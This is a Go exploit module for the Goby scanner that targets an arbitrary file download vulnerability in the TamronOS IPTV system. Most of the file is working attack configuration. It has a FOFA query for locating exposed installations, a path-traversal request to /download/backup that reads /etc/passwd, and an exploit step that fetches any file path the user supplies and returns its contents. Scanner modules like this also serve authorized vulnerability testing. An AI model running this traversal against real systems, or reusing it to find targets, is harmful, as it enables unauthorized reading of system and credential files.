package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TamronOS IPTV backup file down vulnerability",
    "Description": "<p>TamronOS IPTV system is an intelligent TV management system. The system has an arbitrary file download vulnerability, through which an attacker can read system files and obtain sensitive information.</p>",
    "Product": "TamronOS-IPTV",
    "Homepage": "http://www.tamronos.com/",
    "DisclosureDate": "2022-12-20",
    "Author": "13eczou",
    "FofaQuery": "title=\"TamronOS IPTV系统\"",
    "GobyQuery": "title=\"TamronOS IPTV系统\"",
    "Level": "1",
    "Impact": "<p>an attacker can read system files and obtain sensitive information.</p>",
    "Recommendation": "<p>1. Upgrade the system version.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "./../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/download/backup?name=./../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filename=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bin/sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/download/backup?name={{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filename=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "TamronOS IPTV 系统 backup 任意文件下载漏洞",
            "Product": "TamronOS-IPTV系统",
            "Description": "<p>TamronOS IPTV 系统是一款智能电视管理系统。该系统存在任意文件下载漏洞，攻击者可通过该漏洞读取系统文件，获取敏感信息。</p>",
            "Recommendation": "<p>1、升级系统版本。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>该系统存在任意文件下载漏洞，攻击者可通过该漏洞读取系统文件，获取敏感信息。</span><br><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "TamronOS IPTV backup file down vulnerability",
            "Product": "TamronOS-IPTV",
            "Description": "<p>TamronOS IPTV system is an intelligent TV management system. The system has an arbitrary file download vulnerability, through which an attacker can read system files and obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. Upgrade the system version.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>an attacker can read system files and obtain sensitive information.</span><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}